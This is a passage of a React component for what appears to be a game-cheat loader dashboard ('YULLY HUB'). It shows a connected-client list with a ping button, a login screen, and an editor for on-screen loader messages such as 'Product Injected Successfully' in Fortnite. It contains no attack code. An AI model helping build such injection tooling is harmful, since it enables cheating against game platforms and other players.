                                            <span style={{ marginLeft: 'auto' }}>up {Math.floor((Date.now() - a.connectedAt)/1000)}s</span>
                                        </div>
                                    ))}
                                </div>
                            )}
                            <button className="psn-launch-btn wide" style={{ marginTop: 12 }} disabled={!state.online}
                                    onClick={() => sendCommand({ type: 'ping' })}>
                                TEST PING
                            </button>
                            <div className="event-log">
                                {events.length === 0 && <div><span className="t">[--:--:--]</span> waiting for events…</div>}
                                {events.map((e) => (
                                    <div key={e.id}><span className="t">[{e.t}]</span> <span className={e.cls}>{e.msg}</span></div>
                                ))}
                            </div>
                        </div>
                    </section>
                )}

                {screen === 'login' && (
                    <section className="psn-panel psn-login" key="login">
                        <img src="/YullyLogo.png" alt="Yully" className="login-yully-logo" />
                        <div className="login-logo"><span className="kw">YULLY</span><span className="sp">HUB</span></div>
                        <div className="input-field"><input type="text" placeholder="Username" /></div>
                        <div className="input-field"><input type="password" placeholder="Password" /></div>
                        <div className="join-line">Don&apos;t have an account? <a href="#">Join us!</a></div>
                        <button className="psn-launch-btn wide">ENTER</button>
                    </section>
                )}

            </div>

            {scriptEditor && (
                <div className="modal-veil" onClick={() => setScriptEditor(null)}>
                    <div className="modal-card" onClick={(e) => e.stopPropagation()}>
                        <div className="modal-head">
                            <div>
                                <div className="modal-title">Dynamic Island Script</div>
                                <div className="modal-sub">
                                    {scriptEditor.title}
                                    <span className={`save-chip ${scriptSaveState}`}>
                                        {scriptSaveState === 'saving' && 'saving…'}
                                        {scriptSaveState === 'saved'  && '✓ saved'}
                                        {scriptSaveState === 'idle'   && ''}
                                    </span>
                                </div>
                            </div>
                            <button className="icon-btn" onClick={() => setScriptEditor(null)}>
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
                            </button>
                        </div>
                        <div className="step-list">
                            {scriptEditor.steps.map((s, i) => (
                                <div className="step-row" key={i}>
                                    <div className="step-idx">{i + 1}</div>
                                    <div className="step-body">
                                        <div className="step-controls">
                                            <select className="step-select" value={s.kind || 'message'}
                                                    onChange={(e) => updateStep(i, { kind: e.target.value })}>
                                                <option value="message">Show message</option>
                                                <option value="success">Show success (✓)</option>
                                                <option value="close">Close (bye pill)</option>
                                            </select>
                                            <div className="step-move">
                                                <button className="mini-btn" onClick={() => moveStep(i, -1)} disabled={i === 0}>↑</button>
                                                <button className="mini-btn" onClick={() => moveStep(i,  1)} disabled={i === scriptEditor.steps.length - 1}>↓</button>
                                                <button className="mini-btn danger" onClick={() => removeStep(i)}>✕</button>
                                            </div>
                                        </div>
                                        {(s.kind || 'message') === 'message' && (
                                            <>
                                                <input className="step-input" type="text"
                                                       placeholder='e.g. Press F2 once you are in Fortnite lobby'
                                                       value={s.text || ''}
                                                       onChange={(e) => updateStep(i, { text: e.target.value })} />
                                                <div className="step-triggers">
                                                    <label>Advance:&nbsp;
                                                        <select className="step-select" value={s.dismiss || 'timeout'}
                                                                onChange={(e) => updateStep(i, { dismiss: e.target.value })}>
                                                            <option value="timeout">After timeout</option>
                                                            <option value="keybind">On keypress</option>
                                                            <option value="both">Either (whichever first)</option>
                                                        </select>
                                                    </label>
                                                    {(s.dismiss === 'timeout' || s.dismiss === 'both' || !s.dismiss) && (
                                                        <label>&nbsp;Timeout:&nbsp;
                                                            <input type="number" className="step-num" min="0" step="0.1"
                                                                   value={s.timeout ?? 2}
                                                                   onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })} />&nbsp;s</label>
                                                    )}
                                                    {(s.dismiss === 'keybind' || s.dismiss === 'both') && (
                                                        <label>&nbsp;Key:&nbsp;
                                                            <input type="text" className="step-num" placeholder='F2'
                                                                   value={s.keybind || ''}
                                                                   onChange={(e) => updateStep(i, { keybind: e.target.value.toUpperCase() })} /></label>
                                                    )}
                                                </div>
                                            </>
                                        )}
                                        {s.kind === 'success' && (
                                            <>
                                                <input className="step-input" type="text" placeholder='e.g. Product Injected Successfully'
                                                       value={s.text || ''} onChange={(e) => updateStep(i, { text: e.target.value })} />
                                                <div className="step-triggers">
                                                    <label>Show for:&nbsp;
                                                        <input type="number" className="step-num" min="0" step="0.1"
                                                               value={s.timeout ?? 2.5}
                                                               onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })} />&nbsp;s</label>
                                                </div>
                                            </>
                                        )}
                                        {s.kind === 'close' && (
                                            <>
                                                <input className="step-input" type="text" placeholder='Click me to close loader'
                                                       value={s.text || ''} onChange={(e) => updateStep(i, { text: e.target.value })} />
                                                <div className="step-triggers">
                                                    <label>Auto-close after:&nbsp;
                                                        <input type="number" className="step-num" min="0" step="0.1"
                                                               value={s.timeout ?? 4}
                                                               onChange={(e) => updateStep(i, { timeout: Number(e.target.value) })} />&nbsp;s</label>
                                                </div>
                                            </>
                                        )}
                                    </div>
                                </div>
                            ))}
                        </div>
                        <div className="modal-foot">
                            <div className="add-step-row">
                                <button className="mini-btn" onClick={() => addStep('message')}>+ Message</button>
                                <button className="mini-btn" onClick={() => addStep('success')}>+ Success ✓</button>
                                <button className="mini-btn" onClick={() => addStep('close')}>+ Close pill</button>
                            </div>
                            <div className="modal-hint">Changes save automatically.</div>
                            <button className="mini-btn" onClick={() => setScriptEditor(null)}>Done</button>
                        </div>
                    </div>
                </div>
            )}
        </>
    );
}
